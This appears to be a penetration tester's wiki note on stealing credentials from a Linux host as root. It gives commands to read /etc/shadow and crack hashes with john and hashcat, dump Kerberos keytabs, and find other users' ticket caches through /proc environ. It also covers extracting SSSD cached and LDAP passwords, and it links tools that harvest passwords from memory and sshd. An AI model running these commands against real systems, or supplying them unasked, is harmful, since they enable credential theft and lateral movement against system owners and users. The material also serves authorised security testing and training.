---
title: Privileged Linux Credential Access
---

[[notes/mitre-attack/credential-access]] as root on [[notes/linux/index]].

Also check everything from [[notes/linux/credential-access-user]].

# Login Passwords

Dump password hashes of local users.

~~~ bash
cat /etc/shadow
cat /etc/passwd
~~~

And crack weak hashes with [[notes/tools/john]].

~~~ bash
unshadow ./passwd ./shadow > ./hashes.txt
john --wordlist=./rockyou.txt ./hashes.txt
~~~

# Kerberos

Keytab files contain a principal name and encrypted keys.
They allow a user or script to authenticate to Kerberos without entering a password.
Keytabs are commonly used in cron scripts.

Dump the keytab of the computer account.

~~~ bash
klist -k -Ke
cat /etc/krb5.keytab
find / -type f -iname '*.keytab' -readable ! -path '/dev/*' ! -path '/proc/*' ! -path '/sys/*' -ls 2> /dev/null
~~~

Request a TGT and authenticate with a keytab.

~~~ bash
kinit administrator@CORP.LOCAL -k -t /tmp/administrator.keytab && klist
~~~

Dump Kerberos TGTs of other users.

~~~ bash
ls -la /var/lib/sss/db/ccache_*
grep -ahoP 'KRB5CCNAME=.*?\x00' /proc/*/environ 2> /dev/null | sort -Vu
find / -type f '(' -iname 'krb5cc_*' -or -iname 'ccache_*' ')' -readable ! -path '/dev/*' ! -path '/proc/*' ! -path '/sys/*' -ls 2> /dev/null
~~~

Download `/var/lib/sss/db/cache_*.ldb` files and try to crack the cached credentials.

~~~ bash
tdbdump ./cache_*.ldb | grep -ia passw
hashcat -O -w 3 -a 0 -m 1800 '$6$...' ./rockyou.txt
~~~

Fetch LDAP passwords from `/etc/sssd/sssd.conf` and decode them with [sss_deobfuscate](https://github.com/mludvig/sss_deobfuscate) ([source](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-linux/#extract-accounts-from-etcsssdsssdconf)).

~~~ bash
grep 'ldap_.*_authtok' /etc/sssd/sssd.conf
~~~

Untested tools:

- [LinikatzV2](https://github.com/Orange-Cyberdefense/LinikatzV2), can extract plain passwords from memory
- [tickey](https://github.com/TarlogicSecurity/tickey), extract Kerberos tickets from all users on Linux

# Applications

Untested tools:

- [mimipenguin](https://github.com/huntergregal/mimipenguin), dump passwords from Gnome Keyring, vsftpd, Apache basic auth and sudo
- [3snake](https://github.com/blendin/3snake), hook sshd and sudo to capture plain passwords

References:

- [SSHD Injection and Password Harvesting](http://web.archive.org/web/20230521144411/https://jm33.me/sshd-injection-and-password-harvesting.html)
- [Stealing SSH credentials](http://web.archive.org/web/20201109040134/https://mthbernardes.github.io/persistence/2018/01/10/stealing-ssh-credentials.html)
